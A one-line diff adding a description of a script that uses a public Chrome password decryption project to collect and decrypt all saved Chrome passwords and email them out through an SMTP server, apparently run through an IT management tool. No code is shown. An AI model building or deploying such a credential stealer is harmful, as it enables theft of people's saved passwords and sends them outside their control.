@@ -1,0 +1,1 @@
+This script is making use of https://github.com/ohyicong/decrypt-chrome-passwords to gather all chrome passwords from file and decrypts them, once decrypted they can be send using an SMTP server information to any email. Tested with Immybot 0.53.10
